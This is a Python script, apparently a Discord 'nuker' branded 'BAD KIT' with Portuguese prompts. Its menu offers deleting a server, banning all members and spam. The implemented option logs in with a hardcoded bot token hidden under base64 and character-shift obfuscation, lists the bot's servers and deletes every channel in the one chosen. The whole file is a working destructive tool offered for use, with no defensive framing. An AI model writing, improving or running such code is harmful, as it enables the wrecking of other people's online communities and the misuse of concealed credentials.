import os
import time
import asyncio
import base64
import discord

# Cores ANSI
red = "\033[91m"
reset = "\033[0m"

ascii_logo = f"""{red}



                    mm        mm                  
                mmmmmmmmmmmmmmmmmmmm              
              mmmmmmmmmmmmmmmmmmmmmmmm            
            mmmmmmmmmmmmmmmmmmmmmmmmmmmm          
            mmmmmmmmmmmmmmmmmmmmmmmmmmmm          
            mmmmmm    mmmmmmmm    mmmmmm          
            mmmmmm      mmmm      mmmmmm          
          mmmmmmmm      mmmm      mmmmmmmm        
          mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm        
          mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm        
            mmmmmmmm            mmmmmmmm          


{reset}"""

# Token ofuscado fornecido por você
token_obf = "TVRNOU56WXdPRE00TXpBM01PNTUzOEcuR21BM1NhLm1NRHVhZGtTYmk2TVVRRlNqUV9Gc0I2UlZHdWN5c3RmY2xiMk8w"

def decode_token(obf):
    try:
        base = obf[::-1]
        step1 = ''.join([chr((ord(c) - 2) % 126) for c in base])

        def base64_padding_fix(s):
            return s + '=' * (-len(s) % 4)

        step1_padded = base64_padding_fix(step1[::-1])
        step2 = base64.b64decode(step1_padded)
        return step2.decode()
    except Exception as e:
        print("Erro ao decodificar o token:", e)
        return None

# Interface inicial
os.system("clear")
print(ascii_logo)
time.sleep(1.5)

print("BAD KIT\n")
time.sleep(1)

print("1 - Apagar servidor")
print("2 - Banir todos")
print("3 - Spam")
print("4 - (em desenvolvimento)")

opcao = input("\nEscolha uma opção: ")

if opcao == "1":
    token = decode_token(token_obf)
    if not token:
        exit("[ERRO] Token inválido ou corrompido.")

    intents = discord.Intents.all()
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print(f"\n[✓] Logado como: {client.user}")
        print("\nServidores disponíveis:\n")

        for idx, guild in enumerate(client.guilds, start=1):
            print(f"{idx} - {guild.name}")

        try:
            escolha = int(input("\nDigite o número do servidor a ser APAGADO: ")) - 1
            guild = client.guilds[escolha]
        except:
            print("[X] Escolha inválida.")
            await client.close()
            return

        print(f"\n[!] Você selecionou: {guild.name}")
        conf = input("Deseja apagar?\n1 - Sim\n2 - Não\n> ")

        if conf != "1":
            print("\n[✓] Ação cancelada.")
            await client.close()
            return

        print(f"\n[!] Apagando todos os canais de: {guild.name}...")

        count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"[+] Canal apagado: {channel.name}")
                count += 1
            except Exception as e:
                print(f"[X] Falha ao apagar {channel.name}: {e}")

        print(f"\n[✔] Total de canais apagados: {count}")
        await client.close()

    asyncio.run(client.start(token))

else:
    print("\n[!] Essa opção ainda está em desenvolvimento.")
